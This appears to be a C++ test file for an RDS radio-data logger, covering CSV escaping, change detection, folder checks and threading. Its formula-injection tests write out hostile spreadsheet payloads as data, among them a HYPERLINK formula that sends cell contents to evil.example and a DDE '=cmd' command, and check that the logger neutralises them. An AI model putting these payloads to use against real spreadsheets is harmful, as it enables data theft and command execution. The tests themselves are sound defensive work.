// Tests for core/rds_log.hpp (engine lane E1, FEATURE-GAPS G4-53): the RDS log. Scratch folders only (PID in the name).
//
// SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0
#include <atomic>
#include <chrono>
#include <cstdio>
#include <filesystem>
#include <fstream>
#include <iterator>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

#ifdef _WIN32
#include <process.h>
#define TEST_GETPID _getpid
#else
#include <unistd.h>
#define TEST_GETPID getpid
#endif

#include "core/rds_log.hpp"
#include "test_check.hpp"

namespace fs = std::filesystem;
namespace rl = cascade::core::rdslog;
using cascade::dsp::RdsState;

namespace {

fs::path g_base;

std::string slurp(const fs::path& p) { std::ifstream f(p, std::ios::binary); return std::string(std::istreambuf_iterator<char>(f), std::istreambuf_iterator<char>()); }
bool has(const std::string& hay, const std::string& needle) { return hay.find(needle) != std::string::npos; }
int lines(const std::string& s) { int n = 0; for (const char c : s) { if (c == '\n') { ++n; } } return n; }

RdsState state(const char* ps, int pty, const char* rt, bool psValid = true) {
    RdsState s;
    s.psValid = psValid;
    s.ps = ps;
    s.pty = static_cast<std::uint8_t>(pty);
    s.radioText = rt;
    s.piValid = true;
    s.pi = 0xC201;   // the PI code must never reach the file
    return s;
}

fs::path fresh(const char* name) {
    const fs::path d = g_base / name;
    std::error_code ec;
    fs::remove_all(d, ec);
    fs::create_directories(d);
    return d;
}

// 2026-11-16 09:30:12 UTC
constexpr std::int64_t kT0 = 1'794'000'000'000LL;

void testPureRules() {
    CHECK(std::string(rl::programmeTypeName(0)) == "None");
    CHECK(std::string(rl::programmeTypeName(1)) == "News");
    CHECK(std::string(rl::programmeTypeName(31)) == "Alarm");
    CHECK(std::string(rl::programmeTypeName(32)).empty());
    CHECK(std::string(rl::programmeTypeName(-1)).empty());
    CHECK(rl::csvField("BBC R4") == "BBC R4");
    CHECK(rl::csvField("a,b") == "\"a,b\"");
    CHECK(rl::csvField("say \"hi\"") == "\"say \"\"hi\"\"\"");
    CHECK(rl::csvField(std::string("tab\there\nline")) == "tab?here?line");                       // control characters never break a line
    CHECK(rl::csvField(std::string("caf\xE9")) == "caf?");                                      // bytes the basic table leaves undefined
    CHECK(rl::csvField(std::string(200, 'x')).size() == rl::kMaxTextBytes);
    CHECK(rl::csvField("").empty());
    // R6 (security review 2): air-sourced text never starts a spreadsheet formula
    CHECK(rl::csvField("=1+1") == "'=1+1");
    CHECK(rl::csvField("+44 20 7946 0000") == "'+44 20 7946 0000");
    CHECK(rl::csvField("-NOW PLAYING") == "'-NOW PLAYING");
    CHECK(rl::csvField("@SUM(A1)") == "'@SUM(A1)");
    CHECK(rl::csvField("=HYPERLINK(\"http://evil.example/?x=\"&A1,\"click\")") == "\"'=HYPERLINK(\"\"http://evil.example/?x=\"\"&A1,\"\"click\"\")\"");   // the guard first, then the quoting
    CHECK(rl::csvField("a=b").find('\'') == std::string::npos && rl::csvField("1+1") == "1+1");                 // only a LEADING character matters
    {
        // and through the line writer: the station name and the radio text of a hostile broadcast
        const std::string line = rl::formatLine(1700000000000LL, 0, "=cmd|' /C calc'!A0", 10, "@SUM(1+1)*cmd");
        CHECK(line.find(",'=cmd") != std::string::npos);
        CHECK(line.find(",'@SUM") != std::string::npos);
        CHECK(line.find(",=") == std::string::npos && line.find(",@") == std::string::npos);
    }
    const std::string l = rl::formatLine(kT0, 2, "BBC R4  ", 4, "Now, the news");
    CHECK(l.back() == '\n');
    CHECK(has(l, ",2,BBC R4,4,Sport,\"Now, the news\"\n"));   // the padding of the 8-character name is dropped
    CHECK(l.find('T') == 10 && has(l.substr(0, 21), "Z,"));
    CHECK(rl::headerLine() == "time_utc,radio,station_name,programme_type_code,programme_type,radio_text\n");
    // changed(): what makes a line
    rl::Last last;
    CHECK(!rl::changed(last, state("", 0, "", false)));        // nothing recovered: nothing to say
    CHECK(rl::changed(last, state("BBC R4  ", 4, "")));
    last.ps = "BBC R4  "; last.pty = 4;
    CHECK(!rl::changed(last, state("BBC R4  ", 4, "")));       // the same again
    CHECK(rl::changed(last, state("BBC R4  ", 5, "")));        // the type moved
    CHECK(rl::changed(last, state("BBC R4  ", 4, "News at six")));
    last.rt = "News at six";
    CHECK(!rl::changed(last, state("BBC R4  ", 4, "News at six")));
    CHECK(rl::changed(last, state("BBC R4  ", 4, "Weather")));
    CHECK(rl::changed(last, state("CLASSIC ", 4, "News at six")));
    CHECK(!rl::changed(last, state("", 4, "News at six", false)));   // a name not yet complete is not a change of the name
}

void testWritesOffTheCallerAndOnlyText() {
    const fs::path d = fresh("write");
    rl::Logger lg;
    rl::Options o;
    o.enabled = true;
    o.folder = d.string();
    std::string why;
    CHECK(lg.configure(o, why));
    CHECK(why.empty());
    lg.observe(1, state("BBC R4  ", 4, ""), kT0, 93.5e6);
    lg.observe(1, state("BBC R4  ", 4, ""), kT0 + 1000, 93.5e6);                  // unchanged: no line
    lg.observe(1, state("BBC R4  ", 4, "Now: the news"), kT0 + 2000, 93.5e6);
    lg.observe(2, state("LBC     ", 10, "Phone in"), kT0 + 3000, 97.3e6);
    lg.flushForTest();
    CHECK(lg.written() == 3);
    CHECK(lg.error().empty());
    // the recorder's {date} token reads the LOCAL clock; accept the one file the folder holds
    std::string all;
    int files = 0;
    for (const auto& e : fs::directory_iterator(d)) { all = slurp(e.path()); ++files; }
    CHECK(files == 1);
    CHECK(lines(all) == 4);   // header + 3 lines, the header once
    CHECK(all.rfind("time_utc,", 0) == 0);
    CHECK(has(all, ",1,BBC R4,4,Sport,\n"));
    CHECK(has(all, ",1,BBC R4,4,Sport,Now: the news\n"));
    CHECK(has(all, ",2,LBC,10,Pop music,Phone in\n"));
    // TEXT ONLY: no frequency, no PI code in the file
    CHECK(!has(all, "93.5"));
    CHECK(!has(all, "97.3"));
    CHECK(!has(all, "C201"));
    CHECK(!has(all, "50689"));
    CHECK(!lg.lastFileName().empty() && lg.lastFileName().find(d.string()) == std::string::npos);   // a name, never the folder
    // appended to on a later run: one header only
    lg.observe(1, state("BBC R4  ", 4, "Weather"), kT0 + 4000, 93.5e6);
    lg.flushForTest();
    for (const auto& e : fs::directory_iterator(d)) { all = slurp(e.path()); }
    CHECK(lines(all) == 5);
    lg.stop();
}

void testOffByDefaultAndSwitchedOff() {
    const fs::path d = fresh("off");
    rl::Logger lg;
    lg.observe(1, state("BBC R4  ", 4, "x"), kT0, 93.5e6);   // never configured: off
    lg.flushForTest();
    CHECK(lg.written() == 0);
    CHECK(fs::is_empty(d));
    rl::Options o;
    o.enabled = true;
    o.folder = d.string();
    std::string why;
    CHECK(lg.configure(o, why));
    o.enabled = false;
    CHECK(lg.configure(o, why));
    lg.observe(1, state("BBC R4  ", 4, "x"), kT0, 93.5e6);
    lg.flushForTest();
    CHECK(lg.written() == 0);
    CHECK(fs::is_empty(d));
    lg.stop();
    lg.stop();   // twice is safe
}

void testRefusalsAreSaid() {
    const fs::path d = fresh("refuse");
    rl::Logger lg;
    rl::Options o;
    o.enabled = true;
    std::string why;
    CHECK(!lg.configure(o, why));   // no folder
    CHECK(!why.empty());
    CHECK(!lg.error().empty());
    o.folder = "relative/folder";
    CHECK(!lg.configure(o, why));
    o.folder = d.string();
    o.nameTemplate = "../escape/{date}";
    CHECK(!lg.configure(o, why));
    CHECK(has(why, "refused"));
    o.nameTemplate = "bad:name";
    CHECK(!lg.configure(o, why));
    o.nameTemplate = "{nonsense}";
    CHECK(!lg.configure(o, why));
    lg.observe(1, state("BBC R4  ", 4, "x"), kT0, 93.5e6);
    lg.flushForTest();
    CHECK(lg.written() == 0);   // nothing written while refused
    o.nameTemplate = "rds_{date}";
    CHECK(lg.configure(o, why));
    CHECK(lg.error().empty());
    // a folder that cannot be made: said, and the next good write clears it
    const fs::path blocker = d / "file-not-folder";
    { std::ofstream(blocker) << "x"; }
    o.folder = (blocker / "sub").string();
    CHECK(lg.configure(o, why));
    lg.observe(1, state("BBC R4  ", 4, "y"), kT0, 93.5e6);
    lg.flushForTest();
    CHECK(lg.written() == 0);
    CHECK(!lg.error().empty());
    o.folder = d.string();
    CHECK(lg.configure(o, why));
    lg.observe(1, state("BBC R4  ", 4, "z"), kT0 + 1000, 93.5e6);
    lg.flushForTest();
    CHECK(lg.written() == 1);
    CHECK(lg.error().empty());
    lg.stop();
}

void testTemplateAndFolders() {
    const fs::path d = fresh("template");
    rl::Logger lg;
    rl::Options o;
    o.enabled = true;
    o.folder = d.string();
    o.nameTemplate = "rds/{freq_mhz}/radio{radio}";   // the user's own file may name the frequency; the lines never do
    std::string why;
    CHECK(lg.configure(o, why));
    lg.observe(3, state("BBC R4  ", 4, ""), kT0, 93.5e6);
    lg.flushForTest();
    CHECK(fs::exists(d / "rds" / "93.5" / "radio3.csv"));
    CHECK(!has(slurp(d / "rds" / "93.5" / "radio3.csv"), "93.5"));
    lg.stop();
}

void testQueueNeverStallsTheCaller() {
    const fs::path d = fresh("burst");
    rl::Logger lg;
    rl::Options o;
    o.enabled = true;
    o.folder = d.string();
    std::string why;
    CHECK(lg.configure(o, why));
    const auto t0 = std::chrono::steady_clock::now();
    for (int i = 0; i < 2000; ++i) {
        lg.observe(1, state("BBC R4  ", 4, ("text " + std::to_string(i)).c_str()), kT0 + i, 93.5e6);
    }
    const auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - t0).count();
    CHECK(ms < 500);   // the caller only compares and queues
    lg.flushForTest();
    CHECK(lg.written() + lg.dropped() == 2000);
    CHECK(lg.written() > 0);
    lg.stop();
}

void testConcurrentObservers() {
    const fs::path d = fresh("conc");
    rl::Logger lg;
    rl::Options o;
    o.enabled = true;
    o.folder = d.string();
    std::string why;
    CHECK(lg.configure(o, why));
    std::vector<std::thread> ts;
    for (int r = 1; r <= 4; ++r) {
        ts.emplace_back([&, r] { for (int i = 0; i < 20; ++i) { lg.observe(r, state("STATION ", r, ("t" + std::to_string(i)).c_str()), kT0 + i, 90e6); } });
    }
    for (auto& t : ts) { t.join(); }
    lg.flushForTest();
    CHECK(lg.written() == 80);
    lg.stop();
}

void testSourceNeverWritesFrequencyOrReportsIt() {
    // the line's fields are fixed by formatLine: a frequency parameter does not exist there
    const std::string l = rl::formatLine(kT0, 1, "A", 1, "b");
    int commas = 0;
    for (const char c : l) { if (c == ',') { ++commas; } }
    CHECK(commas == 5);   // six columns, none of them a frequency or a PI code
}

}  // namespace

int main() {
    g_base = fs::temp_directory_path() / ("foxsdr-test-rds-log-" + std::to_string(TEST_GETPID()));
    std::error_code ec;
    fs::remove_all(g_base, ec);
    fs::create_directories(g_base);
    testPureRules();
    testWritesOffTheCallerAndOnlyText();
    testOffByDefaultAndSwitchedOff();
    testRefusalsAreSaid();
    testTemplateAndFolders();
    testQueueNeverStallsTheCaller();
    testConcurrentObservers();
    testSourceNeverWritesFrequencyOrReportsIt();
    fs::remove_all(g_base, ec);
    return testSummary("test_rds_log");
}
